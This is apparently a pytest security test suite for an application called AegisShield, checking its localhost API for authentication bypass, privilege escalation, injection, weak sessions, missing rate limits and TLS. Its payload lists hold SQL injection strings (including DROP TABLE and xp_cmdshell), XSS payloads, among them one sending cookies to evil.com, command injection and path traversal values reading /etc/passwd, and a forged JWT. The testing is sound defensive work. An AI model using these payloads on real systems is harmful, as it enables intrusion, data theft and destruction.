#!/usr/bin/env python3
"""
Comprehensive security testing suite for AegisShield
Tests authentication, authorization, input validation, and API security
"""

import pytest
import requests
import asyncio
import json
import time
import hashlib
import base64
import jwt
from datetime import datetime, timedelta
from typing import Dict, List, Any, Optional
from urllib.parse import urljoin, quote
import uuid
import subprocess
import re
import ssl
import socket
from dataclasses import dataclass

# Security test configuration
@dataclass
class SecurityTestConfig:
    """Configuration for security testing"""
    api_base_url: str = "http://localhost:8080"
    frontend_base_url: str = "http://localhost:3000"
    admin_email: str = "admin@aegisshield.com"
    admin_password: str = "admin_password_123"
    investigator_email: str = "investigator@aegisshield.com"
    investigator_password: str = "investigator_password_123"
    
    # Test parameters
    test_timeout: int = 30
    rate_limit_threshold: int = 100
    brute_force_attempts: int = 50
    sql_injection_payloads: List[str] = None
    xss_payloads: List[str] = None
    
    def __post_init__(self):
        if self.sql_injection_payloads is None:
            self.sql_injection_payloads = [
                "' OR '1'='1",
                "'; DROP TABLE users; --",
                "' UNION SELECT password FROM users WHERE '1'='1",
                "1' OR 1=1 --",
                "admin'--",
                "' OR 1=1#",
                "') OR ('1'='1",
                "1; EXEC xp_cmdshell('dir')",
                "' OR EXISTS(SELECT * FROM users WHERE username='admin') --"
            ]
            
        if self.xss_payloads is None:
            self.xss_payloads = [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg/onload=alert('XSS')>",
                "javascript:alert('XSS')",
                "<iframe src=javascript:alert('XSS')>",
                "<body onload=alert('XSS')>",
                "'><script>alert('XSS')</script>",
                "\"><script>alert('XSS')</script>",
                "<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>"
            ]

@dataclass
class SecurityTestResult:
    """Results from security testing"""
    test_name: str
    passed: bool
    vulnerabilities: List[str]
    recommendations: List[str]
    risk_level: str  # low, medium, high, critical
    details: Dict[str, Any]

class SecurityTestSuite:
    """Comprehensive security testing suite"""
    
    def __init__(self, config: SecurityTestConfig):
        self.config = config
        self.session = requests.Session()
        self.auth_tokens = {}
        self.results = []
        
    def authenticate_user(self, email: str, password: str) -> Optional[str]:
        """Authenticate a user and return access token"""
        try:
            response = self.session.post(
                urljoin(self.config.api_base_url, "/auth/login"),
                json={"email": email, "password": password},
                timeout=self.config.test_timeout
            )
            
            if response.status_code == 200:
                data = response.json()
                return data.get("access_token")
        except Exception as e:
            print(f"Authentication failed: {e}")
        
        return None
    
    def setup_auth_tokens(self):
        """Setup authentication tokens for testing"""
        admin_token = self.authenticate_user(self.config.admin_email, self.config.admin_password)
        investigator_token = self.authenticate_user(self.config.investigator_email, self.config.investigator_password)
        
        self.auth_tokens = {
            "admin": admin_token,
            "investigator": investigator_token
        }
        
        if not admin_token or not investigator_token:
            raise Exception("Failed to authenticate test users")
    
    def test_authentication_bypass(self) -> SecurityTestResult:
        """Test for authentication bypass vulnerabilities"""
        print("Testing authentication bypass...")
        
        vulnerabilities = []
        recommendations = []
        
        # Test 1: Direct API access without authentication
        protected_endpoints = [
            "/api/cases",
            "/api/entities",
            "/api/investigations",
            "/api/admin/users",
            "/api/admin/settings"
        ]
        
        for endpoint in protected_endpoints:
            try:
                response = self.session.get(
                    urljoin(self.config.api_base_url, endpoint),
                    timeout=self.config.test_timeout
                )
                
                if response.status_code != 401:
                    vulnerabilities.append(f"Endpoint {endpoint} accessible without authentication (status: {response.status_code})")
            except Exception:
                pass
        
        # Test 2: JWT token manipulation
        if self.auth_tokens.get("investigator"):
            try:
                # Decode the JWT without verification
                token = self.auth_tokens["investigator"]
                decoded = jwt.decode(token, options={"verify_signature": False})
                
                # Try to modify role
                decoded["role"] = "admin"
                
                # Create a new token (this should fail)
                modified_token = jwt.encode(decoded, "fake_secret", algorithm="HS256")
                
                response = self.session.get(
                    urljoin(self.config.api_base_url, "/api/admin/users"),
                    headers={"Authorization": f"Bearer {modified_token}"},
                    timeout=self.config.test_timeout
                )
                
                if response.status_code == 200:
                    vulnerabilities.append("JWT signature verification not enforced")
                    
            except Exception:
                pass
        
        # Test 3: Session fixation
        try:
            # Get a session ID before authentication
            response = self.session.get(urljoin(self.config.frontend_base_url, "/login"))
            old_cookies = self.session.cookies.copy()
            
            # Authenticate
            self.authenticate_user(self.config.investigator_email, self.config.investigator_password)
            
            # Check if session ID changed
            new_cookies = self.session.cookies.copy()
            if old_cookies == new_cookies:
                vulnerabilities.append("Session fixation vulnerability - session ID not regenerated after authentication")
                
        except Exception:
            pass
        
        # Recommendations
        if vulnerabilities:
            recommendations.extend([
                "Implement proper authentication middleware for all protected endpoints",
                "Use strong JWT secret keys and verify signatures",
                "Regenerate session IDs after authentication",
                "Implement rate limiting for authentication endpoints",
                "Use secure session configuration"
            ])
        
        risk_level = "critical" if len(vulnerabilities) > 2 else "high" if vulnerabilities else "low"
        
        return SecurityTestResult(
            test_name="Authentication Bypass",
            passed=len(vulnerabilities) == 0,
            vulnerabilities=vulnerabilities,
            recommendations=recommendations,
            risk_level=risk_level,
            details={"tested_endpoints": protected_endpoints}
        )
    
    def test_authorization_flaws(self) -> SecurityTestResult:
        """Test for authorization and privilege escalation vulnerabilities"""
        print("Testing authorization flaws...")
        
        vulnerabilities = []
        recommendations = []
        
        # Test 1: Horizontal privilege escalation
        if self.auth_tokens.get("investigator"):
            try:
                # Try to access another user's data
                response = self.session.get(
                    urljoin(self.config.api_base_url, "/api/users/admin"),
                    headers={"Authorization": f"Bearer {self.auth_tokens['investigator']}"},
                    timeout=self.config.test_timeout
                )
                
                if response.status_code == 200:
                    vulnerabilities.append("Horizontal privilege escalation - investigator can access admin user data")
                    
            except Exception:
                pass
        
        # Test 2: Vertical privilege escalation
        if self.auth_tokens.get("investigator"):
            admin_endpoints = [
                "/api/admin/users",
                "/api/admin/settings",
                "/api/admin/audit-logs",
                "/api/admin/system-config"
            ]
            
            for endpoint in admin_endpoints:
                try:
                    response = self.session.get(
                        urljoin(self.config.api_base_url, endpoint),
                        headers={"Authorization": f"Bearer {self.auth_tokens['investigator']}"},
                        timeout=self.config.test_timeout
                    )
                    
                    if response.status_code == 200:
                        vulnerabilities.append(f"Vertical privilege escalation - investigator can access admin endpoint: {endpoint}")
                        
                except Exception:
                    pass
        
        # Test 3: Object-level authorization
        if self.auth_tokens.get("investigator"):
            try:
                # Create a test case
                create_response = self.session.post(
                    urljoin(self.config.api_base_url, "/api/cases"),
                    headers={"Authorization": f"Bearer {self.auth_tokens['investigator']}"},
                    json={
                        "title": "Security Test Case",
                        "description": "Test case for security testing",
                        "priority": "medium"
                    },
                    timeout=self.config.test_timeout
                )
                
                if create_response.status_code == 201:
                    case_id = create_response.json().get("id")
                    
                    # Try to access the case with a different user ID in the URL
                    response = self.session.get(
                        urljoin(self.config.api_base_url, f"/api/cases/{case_id}?user_id=999"),
                        headers={"Authorization": f"Bearer {self.auth_tokens['investigator']}"},
                        timeout=self.config.test_timeout
                    )
                    
                    if response.status_code == 200:
                        vulnerabilities.append("Object-level authorization bypass via parameter manipulation")
                        
            except Exception:
                pass
        
        # Test 4: Function-level access control
        restricted_functions = [
            {"method": "DELETE", "endpoint": "/api/admin/users/1"},
            {"method": "PUT", "endpoint": "/api/admin/settings"},
            {"method": "POST", "endpoint": "/api/admin/users"},
            {"method": "DELETE", "endpoint": "/api/cases/1"}
        ]
        
        if self.auth_tokens.get("investigator"):
            for func in restricted_functions:
                try:
                    response = self.session.request(
                        func["method"],
                        urljoin(self.config.api_base_url, func["endpoint"]),
                        headers={"Authorization": f"Bearer {self.auth_tokens['investigator']}"},
                        timeout=self.config.test_timeout
                    )
                    
                    if response.status_code not in [401, 403]:
                        vulnerabilities.append(f"Function-level access control bypass: {func['method']} {func['endpoint']}")
                        
                except Exception:
                    pass
        
        # Recommendations
        if vulnerabilities:
            recommendations.extend([
                "Implement proper role-based access control (RBAC)",
                "Validate user permissions for each resource access",
                "Use object-level authorization checks",
                "Implement function-level access controls",
                "Audit and log all authorization decisions"
            ])
        
        risk_level = "high" if len(vulnerabilities) > 2 else "medium" if vulnerabilities else "low"
        
        return SecurityTestResult(
            test_name="Authorization Flaws",
            passed=len(vulnerabilities) == 0,
            vulnerabilities=vulnerabilities,
            recommendations=recommendations,
            risk_level=risk_level,
            details={"tested_functions": restricted_functions}
        )
    
    def test_input_validation(self) -> SecurityTestResult:
        """Test for input validation vulnerabilities"""
        print("Testing input validation...")
        
        vulnerabilities = []
        recommendations = []
        
        # Test 1: SQL Injection
        if self.auth_tokens.get("investigator"):
            for payload in self.config.sql_injection_payloads:
                try:
                    # Test search endpoints
                    response = self.session.get(
                        urljoin(self.config.api_base_url, "/api/entities/search"),
                        headers={"Authorization": f"Bearer {self.auth_tokens['investigator']}"},
                        params={"q": payload},
                        timeout=self.config.test_timeout
                    )
                    
                    # Check for SQL error messages or unexpected responses
                    if response.status_code == 500 or "sql" in response.text.lower() or "database" in response.text.lower():
                        vulnerabilities.append(f"Potential SQL injection vulnerability with payload: {payload}")
                        break
                        
                except Exception:
                    pass
        
        # Test 2: NoSQL Injection
        nosql_payloads = [
            {"$ne": ""},
            {"$regex": ".*"},
            {"$where": "1==1"},
            {"$gt": ""}
        ]
        
        if self.auth_tokens.get("investigator"):
            for payload in nosql_payloads:
                try:
                    response = self.session.post(
                        urljoin(self.config.api_base_url, "/api/entities/search"),
                        headers={"Authorization": f"Bearer {self.auth_tokens['investigator']}"},
                        json={"filters": payload},
                        timeout=self.config.test_timeout
                    )
                    
                    if response.status_code == 500:
                        vulnerabilities.append(f"Potential NoSQL injection vulnerability")
                        break
                        
                except Exception:
                    pass
        
        # Test 3: XSS
        if self.auth_tokens.get("investigator"):
            for payload in self.config.xss_payloads:
                try:
                    # Test case creation with XSS payload
                    response = self.session.post(
                        urljoin(self.config.api_base_url, "/api/cases"),
                        headers={"Authorization": f"Bearer {self.auth_tokens['investigator']}"},
                        json={
                            "title": payload,
                            "description": f"Test case with payload: {payload}",
                            "priority": "low"
                        },
                        timeout=self.config.test_timeout
                    )
                    
                    if response.status_code == 201:
                        case_id = response.json().get("id")
                        
                        # Retrieve the case and check if payload is reflected
                        get_response = self.session.get(
                            urljoin(self.config.api_base_url, f"/api/cases/{case_id}"),
                            headers={"Authorization": f"Bearer {self.auth_tokens['investigator']}"},
                            timeout=self.config.test_timeout
                        )
                        
                        if payload in get_response.text and "<script>" in payload:
                            vulnerabilities.append(f"Stored XSS vulnerability with payload: {payload}")
                            break
                            
                except Exception:
                    pass
        
        # Test 4: Command Injection
        command_payloads = [
            "; ls -la",
            "| whoami",
            "&& cat /etc/passwd",
            "`id`",
            "$(whoami)"
        ]
        
        if self.auth_tokens.get("investigator"):
            for payload in command_payloads:
                try:
                    response = self.session.post(
                        urljoin(self.config.api_base_url, "/api/tools/validate"),
                        headers={"Authorization": f"Bearer {self.auth_tokens['investigator']}"},
                        json={"command": payload},
                        timeout=self.config.test_timeout
                    )
                    
                    if response.status_code == 500:
                        vulnerabilities.append(f"Potential command injection vulnerability")
                        break
                        
                except Exception:
                    pass
        
        # Test 5: Path Traversal
        path_traversal_payloads = [
            "../../../etc/passwd",
            "....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
        ]
        
        for payload in path_traversal_payloads:
            try:
                response = self.session.get(
                    urljoin(self.config.api_base_url, f"/api/files/{payload}"),
                    headers={"Authorization": f"Bearer {self.auth_tokens.get('investigator', '')}"},
                    timeout=self.config.test_timeout
                )
                
                if "root:" in response.text or "[hosts]" in response.text:
                    vulnerabilities.append(f"Path traversal vulnerability with payload: {payload}")
                    break
                    
            except Exception:
                pass
        
        # Recommendations
        if vulnerabilities:
            recommendations.extend([
                "Implement parameterized queries to prevent SQL injection",
                "Sanitize and validate all user inputs",
                "Use output encoding to prevent XSS",
                "Implement Content Security Policy (CSP)",
                "Validate file paths and restrict file access",
                "Use input validation libraries and frameworks"
            ])
        
        risk_level = "critical" if "injection" in str(vulnerabilities) else "high" if vulnerabilities else "low"
        
        return SecurityTestResult(
            test_name="Input Validation",
            passed=len(vulnerabilities) == 0,
            vulnerabilities=vulnerabilities,
            recommendations=recommendations,
            risk_level=risk_level,
            details={
                "sql_payloads_tested": len(self.config.sql_injection_payloads),
                "xss_payloads_tested": len(self.config.xss_payloads),
                "command_payloads_tested": len(command_payloads)
            }
        )
    
    def test_session_management(self) -> SecurityTestResult:
        """Test session management security"""
        print("Testing session management...")
        
        vulnerabilities = []
        recommendations = []
        
        # Test 1: Session timeout
        if self.auth_tokens.get("investigator"):
            try:
                # Wait for session timeout (simulate)
                time.sleep(2)
                
                response = self.session.get(
                    urljoin(self.config.api_base_url, "/api/cases"),
                    headers={"Authorization": f"Bearer {self.auth_tokens['investigator']}"},
                    timeout=self.config.test_timeout
                )
                
                # Check if session is still valid after expected timeout
                # Note: This is a simplified test - real timeout testing would require longer waits
                if response.status_code == 200:
                    # Check if the token has proper expiration
                    token = self.auth_tokens['investigator']
                    try:
                        decoded = jwt.decode(token, options={"verify_signature": False})
                        exp = decoded.get('exp')
                        if not exp:
                            vulnerabilities.append("JWT tokens do not have expiration time")
                        elif exp > int(time.time()) + 86400:  # More than 1 day
                            vulnerabilities.append("JWT tokens have excessive expiration time")
                    except Exception:
                        pass
                        
            except Exception:
                pass
        
        # Test 2: Concurrent sessions
        try:
            # Authenticate from multiple "devices"
            token1 = self.authenticate_user(self.config.investigator_email, self.config.investigator_password)
            token2 = self.authenticate_user(self.config.investigator_email, self.config.investigator_password)
            
            if token1 and token2 and token1 == token2:
                vulnerabilities.append("Same session token issued for concurrent logins")
                
        except Exception:
            pass
        
        # Test 3: Session invalidation
        try:
            # Test logout functionality
            response = self.session.post(
                urljoin(self.config.api_base_url, "/auth/logout"),
                headers={"Authorization": f"Bearer {self.auth_tokens.get('investigator', '')}"},
                timeout=self.config.test_timeout
            )
            
            if response.status_code == 200:
                # Try to use the token after logout
                test_response = self.session.get(
                    urljoin(self.config.api_base_url, "/api/cases"),
                    headers={"Authorization": f"Bearer {self.auth_tokens.get('investigator', '')}"},
                    timeout=self.config.test_timeout
                )
                
                if test_response.status_code == 200:
                    vulnerabilities.append("Session not properly invalidated after logout")
                    
        except Exception:
            pass
        
        # Test 4: Cookie security
        try:
            response = self.session.get(urljoin(self.config.frontend_base_url, "/login"))
            
            for cookie in self.session.cookies:
                if not cookie.secure and "https" in self.config.frontend_base_url:
                    vulnerabilities.append(f"Cookie {cookie.name} not marked as secure")
                
                if not hasattr(cookie, 'httponly') or not cookie.httponly:
                    vulnerabilities.append(f"Cookie {cookie.name} not marked as HTTPOnly")
                    
        except Exception:
            pass
        
        # Recommendations
        if vulnerabilities:
            recommendations.extend([
                "Implement proper session timeout mechanisms",
                "Invalidate sessions after logout",
                "Use secure cookie attributes (Secure, HTTPOnly, SameSite)",
                "Implement session invalidation after password changes",
                "Monitor and limit concurrent sessions per user"
            ])
        
        risk_level = "medium" if vulnerabilities else "low"
        
        return SecurityTestResult(
            test_name="Session Management",
            passed=len(vulnerabilities) == 0,
            vulnerabilities=vulnerabilities,
            recommendations=recommendations,
            risk_level=risk_level,
            details={}
        )
    
    def test_rate_limiting(self) -> SecurityTestResult:
        """Test rate limiting and DoS protection"""
        print("Testing rate limiting...")
        
        vulnerabilities = []
        recommendations = []
        
        # Test 1: Authentication rate limiting
        failed_attempts = 0
        for i in range(self.config.brute_force_attempts):
            try:
                response = self.session.post(
                    urljoin(self.config.api_base_url, "/auth/login"),
                    json={
                        "email": "nonexistent@example.com",
                        "password": f"wrong_password_{i}"
                    },
                    timeout=self.config.test_timeout
                )
                
                if response.status_code != 429:  # Not rate limited
                    failed_attempts += 1
                else:
                    break
                    
            except Exception:
                pass
        
        if failed_attempts >= self.config.brute_force_attempts:
            vulnerabilities.append("No rate limiting on authentication endpoint - brute force possible")
        
        # Test 2: API rate limiting
        api_requests = 0
        if self.auth_tokens.get("investigator"):
            for i in range(self.config.rate_limit_threshold):
                try:
                    response = self.session.get(
                        urljoin(self.config.api_base_url, "/api/cases"),
                        headers={"Authorization": f"Bearer {self.auth_tokens['investigator']}"},
                        timeout=self.config.test_timeout
                    )
                    
                    if response.status_code != 429:
                        api_requests += 1
                    else:
                        break
                        
                except Exception:
                    break
            
            if api_requests >= self.config.rate_limit_threshold:
                vulnerabilities.append("No rate limiting on API endpoints")
        
        # Test 3: Resource exhaustion
        try:
            # Test large request bodies
            large_payload = "A" * (10 * 1024 * 1024)  # 10MB payload
            
            response = self.session.post(
                urljoin(self.config.api_base_url, "/api/cases"),
                headers={"Authorization": f"Bearer {self.auth_tokens.get('investigator', '')}"},
                json={
                    "title": "Test Case",
                    "description": large_payload
                },
                timeout=self.config.test_timeout
            )
            
            if response.status_code != 413:  # Payload too large
                vulnerabilities.append("No request size limiting - resource exhaustion possible")
                
        except Exception:
            pass
        
        # Recommendations
        if vulnerabilities:
            recommendations.extend([
                "Implement rate limiting on authentication endpoints",
                "Add rate limiting to API endpoints",
                "Implement request size limits",
                "Use CAPTCHA for repeated failed attempts",
                "Monitor and alert on suspicious traffic patterns"
            ])
        
        risk_level = "medium" if vulnerabilities else "low"
        
        return SecurityTestResult(
            test_name="Rate Limiting",
            passed=len(vulnerabilities) == 0,
            vulnerabilities=vulnerabilities,
            recommendations=recommendations,
            risk_level=risk_level,
            details={
                "brute_force_attempts": failed_attempts,
                "api_requests_made": api_requests
            }
        )
    
    def test_ssl_tls_configuration(self) -> SecurityTestResult:
        """Test SSL/TLS configuration"""
        print("Testing SSL/TLS configuration...")
        
        vulnerabilities = []
        recommendations = []
        
        if not self.config.api_base_url.startswith("https://"):
            vulnerabilities.append("API not using HTTPS")
            recommendations.append("Enable HTTPS for all API endpoints")
        
        if not self.config.frontend_base_url.startswith("https://"):
            vulnerabilities.append("Frontend not using HTTPS")
            recommendations.append("Enable HTTPS for frontend application")
        
        # Test SSL certificate if HTTPS is used
        if self.config.api_base_url.startswith("https://"):
            try:
                from urllib.parse import urlparse
                parsed_url = urlparse(self.config.api_base_url)
                
                context = ssl.create_default_context()
                with socket.create_connection((parsed_url.hostname, parsed_url.port or 443)) as sock:
                    with context.wrap_socket(sock, server_hostname=parsed_url.hostname) as ssock:
                        cert = ssock.getpeercert()
                        
                        # Check certificate expiration
                        import datetime
                        not_after = datetime.datetime.strptime(cert['notAfter'], '%b %d %H:%M:%S %Y %Z')
                        if not_after < datetime.datetime.now() + datetime.timedelta(days=30):
                            vulnerabilities.append("SSL certificate expires within 30 days")
                            
            except Exception as e:
                vulnerabilities.append(f"SSL certificate validation failed: {str(e)}")
        
        risk_level = "high" if "not using HTTPS" in str(vulnerabilities) else "medium" if vulnerabilities else "low"
        
        return SecurityTestResult(
            test_name="SSL/TLS Configuration",
            passed=len(vulnerabilities) == 0,
            vulnerabilities=vulnerabilities,
            recommendations=recommendations,
            risk_level=risk_level,
            details={}
        )
    
    def run_comprehensive_security_test(self) -> Dict[str, Any]:
        """Execute complete security test suite"""
        print("🔒 Starting Comprehensive Security Test")
        print("=" * 60)
        
        try:
            # Setup authentication
            self.setup_auth_tokens()
            
            # Execute test phases
            auth_bypass_result = self.test_authentication_bypass()
            self.results.append(auth_bypass_result)
            
            authz_result = self.test_authorization_flaws()
            self.results.append(authz_result)
            
            input_validation_result = self.test_input_validation()
            self.results.append(input_validation_result)
            
            session_mgmt_result = self.test_session_management()
            self.results.append(session_mgmt_result)
            
            rate_limiting_result = self.test_rate_limiting()
            self.results.append(rate_limiting_result)
            
            ssl_tls_result = self.test_ssl_tls_configuration()
            self.results.append(ssl_tls_result)
            
            # Calculate overall security score
            total_tests = len(self.results)
            passed_tests = sum(1 for r in self.results if r.passed)
            security_score = (passed_tests / total_tests) * 100 if total_tests > 0 else 0
            
            # Categorize vulnerabilities by risk level
            critical_vulns = []
            high_vulns = []
            medium_vulns = []
            low_vulns = []
            
            for result in self.results:
                if result.risk_level == "critical":
                    critical_vulns.extend(result.vulnerabilities)
                elif result.risk_level == "high":
                    high_vulns.extend(result.vulnerabilities)
                elif result.risk_level == "medium":
                    medium_vulns.extend(result.vulnerabilities)
                else:
                    low_vulns.extend(result.vulnerabilities)
            
            # Generate summary
            summary = {
                "security_score": security_score,
                "total_tests": total_tests,
                "passed_tests": passed_tests,
                "failed_tests": total_tests - passed_tests,
                "vulnerabilities": {
                    "critical": critical_vulns,
                    "high": high_vulns,
                    "medium": medium_vulns,
                    "low": low_vulns
                },
                "test_results": self.results,
                "overall_risk_level": self._calculate_overall_risk_level(critical_vulns, high_vulns, medium_vulns)
            }
            
            print("\n" + "=" * 60)
            print("🔒 SECURITY TEST SUMMARY")
            print("=" * 60)
            print(f"Security Score: {security_score:.1f}%")
            print(f"Tests Passed: {passed_tests}/{total_tests}")
            print(f"Critical Vulnerabilities: {len(critical_vulns)}")
            print(f"High Risk Vulnerabilities: {len(high_vulns)}")
            print(f"Medium Risk Vulnerabilities: {len(medium_vulns)}")
            print(f"Low Risk Vulnerabilities: {len(low_vulns)}")
            print(f"Overall Risk Level: {summary['overall_risk_level'].upper()}")
            
            if security_score >= 90:
                print("🎉 Excellent security posture!")
            elif security_score >= 75:
                print("✅ Good security posture with minor issues")
            elif security_score >= 50:
                print("⚠️  Moderate security issues - remediation needed")
            else:
                print("❌ Significant security vulnerabilities - immediate action required")
            
            # Print detailed results
            print("\n--- Detailed Test Results ---")
            for result in self.results:
                status = "PASS" if result.passed else "FAIL"
                print(f"{result.test_name}: {status} ({result.risk_level} risk)")
                if result.vulnerabilities:
                    for vuln in result.vulnerabilities:
                        print(f"  - {vuln}")
                        
            return summary
            
        except Exception as e:
            print(f"Security test failed: {e}")
            return {"error": str(e)}
    
    def _calculate_overall_risk_level(self, critical: List, high: List, medium: List) -> str:
        """Calculate overall risk level based on vulnerabilities"""
        if critical:
            return "critical"
        elif len(high) > 2:
            return "high"
        elif len(high) > 0 or len(medium) > 3:
            return "medium"
        else:
            return "low"


# Test execution functions
@pytest.mark.asyncio
async def test_authentication_security():
    """Test authentication security"""
    config = SecurityTestConfig()
    test_suite = SecurityTestSuite(config)
    
    result = test_suite.test_authentication_bypass()
    assert result.passed, f"Authentication security test failed: {result.vulnerabilities}"

@pytest.mark.asyncio
async def test_authorization_security():
    """Test authorization security"""
    config = SecurityTestConfig()
    test_suite = SecurityTestSuite(config)
    
    try:
        test_suite.setup_auth_tokens()
        result = test_suite.test_authorization_flaws()
        assert result.passed, f"Authorization security test failed: {result.vulnerabilities}"
    except Exception as e:
        pytest.skip(f"Could not setup authentication for test: {e}")

@pytest.mark.asyncio
async def test_input_validation_security():
    """Test input validation security"""
    config = SecurityTestConfig()
    test_suite = SecurityTestSuite(config)
    
    try:
        test_suite.setup_auth_tokens()
        result = test_suite.test_input_validation()
        assert result.passed, f"Input validation security test failed: {result.vulnerabilities}"
    except Exception as e:
        pytest.skip(f"Could not setup authentication for test: {e}")

@pytest.mark.asyncio
async def test_comprehensive_security():
    """Execute the complete security test suite"""
    config = SecurityTestConfig()
    test_suite = SecurityTestSuite(config)
    
    summary = test_suite.run_comprehensive_security_test()
    
    # Ensure no critical vulnerabilities
    assert len(summary.get("vulnerabilities", {}).get("critical", [])) == 0, "Critical security vulnerabilities found"
    
    # Ensure security score is acceptable
    security_score = summary.get("security_score", 0)
    assert security_score >= 75, f"Security score too low: {security_score}%"


if __name__ == "__main__":
    """Direct execution for debugging"""
    async def main():
        config = SecurityTestConfig()
        test_suite = SecurityTestSuite(config)
        await test_suite.run_comprehensive_security_test()
        
    asyncio.run(main())